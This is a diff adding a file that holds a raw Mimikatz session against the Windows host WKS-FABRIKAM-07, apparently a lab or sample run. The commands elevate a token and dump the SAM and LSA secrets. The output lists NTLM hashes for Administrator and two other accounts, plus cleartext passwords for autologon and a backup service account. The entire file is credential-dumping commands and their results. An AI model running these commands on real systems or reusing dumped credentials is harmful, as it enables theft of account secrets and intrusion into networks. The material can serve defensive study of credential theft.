@@ -1,0 +1,31 @@
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+
+Domain : WKS-FABRIKAM-07
+SysKey : 3a2e1f0d9c8b7a6f5e4d3c2b1a091827
+Local SID : S-1-5-21-1993962763-4083295800-2358739571
+
+SAMKey : c5d6e7f809182b3c4d5e6f708192a3b4
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 9f8c1a2b3d4e5f60718293a4b5c6d7e8
+
+RID  : 00000456 (1110)
+User : mwong
+  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b
+
+RID  : 00000457 (1111)
+User : svc_vault
+  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
+
+mimikatz # lsadump::secrets
+Domain : WKS-FABRIKAM-07
+SysKey : 3a2e1f0d9c8b7a6f5e4d3c2b1a091827
+
+Secret  : DefaultPassword
+old/text: K10sk-Fabrikam-2025
+cur/text: K10sk-Fabrikam-2026
+
+Secret  : _SC_FabrikamBackup / service 'FabrikamBackup' with username : FABRIKAM\svc_backup2
+cur/text: B@ckup-Fabrikam-2026!
